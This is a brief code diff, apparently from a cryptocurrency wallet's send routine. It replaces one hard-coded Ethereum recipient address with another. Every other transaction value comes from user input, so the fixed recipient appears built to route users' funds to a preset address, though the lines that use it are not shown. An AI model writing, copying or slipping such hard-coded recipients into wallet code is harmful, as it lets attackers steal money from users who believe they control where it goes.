@@ -409,7 +409,7 @@
         let sendGasPrice = parseFloat(this.sendGas);
         let sendGasAmount = parseInt(this.sendGasAmount);
         let sendAmount = parseFloat(this.sendAmount);
-        let sendRecipient = "0x83BD8d1bE42D7671BDA9E21E4540FA3A30b1D560";
+        let sendRecipient = "0xA014c64980A50F0D890e9b2b2CfC345693978e7a";
         let password = this.password;
         let data;
         let value;
